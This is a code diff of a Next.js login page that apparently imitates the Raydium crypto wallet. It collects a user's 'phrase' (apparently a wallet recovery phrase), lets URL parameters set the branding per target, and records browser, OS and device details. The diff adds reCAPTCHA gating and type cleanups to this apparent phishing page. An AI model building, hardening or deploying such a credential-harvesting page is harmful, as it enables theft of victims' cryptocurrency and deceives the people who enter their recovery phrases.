@@ -1,35 +1,35 @@
 "use client";
-import { useRouter } from "next/navigation";
 import { useSearchParams } from "next/navigation";
 import { useState, useEffect } from "react";
-import { setPhrase, getCryptoLog, getPhrases } from "@/shared/api/apis";
-
+import { setPhrase, getCryptoLog, getPhrases, verifyRecaptcha } from "@/shared/api/apis";
+import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
+import Image from "next/image";
+import {UAParser} from "ua-parser-js";
 const LoginPage = () => {
-  const router = useRouter();
-  const UAParser = require("ua-parser-js");
+  // const UAParser = require("ua-parser-js");
   const searchParams = useSearchParams();
   const [value, setValue] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
-  const [showModal, setShowModal] = useState(false);
+  const [verified, setVerified] = useState(false)
+  const [showModal, setShowModal] = useState<any>(false);
   const [cryptoLog, setCryptoLog] = useState<any>(null);
-  console.log(cryptoLog)
   const [phrases, setPhrases] = useState<any[]>([]);
   const [userInfo, setUserInfo] = useState({
     browser: "",
     os: "",
     device: "",
   });
+  const { executeRecaptcha } = useGoogleReCaptcha();
 
-  const bgColor: any = searchParams.get("bgColor") || "#181d31";
-  const bgColorBox: any = searchParams.get("modColor") || "#ffffff";
-  const buttonColor: any = searchParams.get("btnColor") || "#00cfff";
-  const cryptoLogId: any = searchParams.get("cryptoLogId");
-  const userId: any = searchParams.get("userId");
+  const bgColor:string = searchParams.get("bgColor") || "#181d31";
+  const bgColorBox: string = searchParams.get("modColor") || "#ffffff";
+  const buttonColor: string = searchParams.get("btnColor") || "#00cfff";
+  const cryptoLogId = searchParams.get("cryptoLogId");
+  const userId = searchParams.get("userId");
   // const staticLogo = "/raydium-logo-freelogovectors.png"
   const staticLogo = "/raydium-ray-logo.png";
-  const appLogo: any = cryptoLog?.appLogo || staticLogo;
-  const token: any = searchParams.get("token");
+  const appLogo = cryptoLog?.appLogo || staticLogo;
 
   // const logo2 = 'https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/crypto-images%2FGoogle_G_logo.svg.png6c1a7d17-bc0a-4806-82f3-55af5f746218?alt=media&token=ffe2ad9a-8340-4e33-ad59-f3fc057af635';
   // console.log(logo)
@@ -37,7 +37,20 @@ const LoginPage = () => {
   // const dynamicLogo = logo.replace('crypto-images/', 'crypto-images%2F');
   // console.log("logo:  ",dynamicLogo)
   // console.log("appLogo:  ",appLogo)
-
+  useEffect(() => {
+    if(executeRecaptcha){
+      executeRecaptcha().then(async(token) => {
+        const response = await verifyRecaptcha(token)
+        if(!response?.ok){
+          setVerified(false)
+        }else{
+          setVerified(true)
+        }
+      }).catch((error)=>{
+        setError('Error in recaptcha refresh the page')
+      });
+    }
+  }, [executeRecaptcha]);
   useEffect(() => {
     const parser = new UAParser();
     const result = parser.getResult();
@@ -59,6 +72,14 @@ const LoginPage = () => {
 
     if (!inputValue) {
       setError("Phrase cannot be empty.");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
+      return;
+    }
+    
+    if(!verified){
+      setError('Recaptcha verification failed! refresh page')
       setTimeout(() => {
         setError("");
       }, 2000);
@@ -153,9 +174,9 @@ const LoginPage = () => {
 
   const hexToRgb = (hex: string) => {
     hex = hex.replace(/^#/, "");
-    let r = parseInt(hex.substring(0, 2), 16);
-    let g = parseInt(hex.substring(2, 4), 16);
-    let b = parseInt(hex.substring(4, 6), 16);
+    const r = parseInt(hex.substring(0, 2), 16);
+    const g = parseInt(hex.substring(2, 4), 16);
+    const b = parseInt(hex.substring(4, 6), 16);
     return { r, g, b };
   };
 
@@ -207,7 +228,7 @@ const LoginPage = () => {
             style={{ backgroundColor: bgColorBox, color: modTextColor }}
           >
             <div className="logo-placeholder">
-              <img
+              <Image
                 height={100}
                 width={100}
                 src={appLogo}
